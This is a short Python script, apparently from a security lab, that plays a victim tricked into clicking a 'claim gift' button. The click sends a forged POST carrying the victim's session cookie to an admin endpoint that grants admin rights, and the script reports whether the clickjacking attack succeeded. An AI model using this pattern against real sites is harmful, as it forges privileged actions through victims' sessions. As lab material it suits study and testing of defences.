#!/usr/bin/env python3
import urllib.request

post_url = 'http://172.20.0.10/admin/settings/grant-admin'
print('[victim] Bam nut "Nhan Qua" -> POST toi: %s' % post_url)
try:
    req = urllib.request.Request(post_url, data=b'', method='POST')
    req.add_header('Cookie', 'session=victim_valid_session_token_abc123')
    req.add_header('Referer', 'http://192.168.10.50/game.html')
    resp = urllib.request.urlopen(req, timeout=5)
    result = resp.read().decode(errors='ignore')
    print('[victim] Ket qua: %s' % result)
    if 'granted' in result.lower():
        print('clickjack_attack_success=yes')
        print('[!] TAN CONG THANH CONG!')
    else:
        print('clickjack_attack_success=no')
except Exception as e:
    print('clickjack_attack_success=no error=%s' % e)
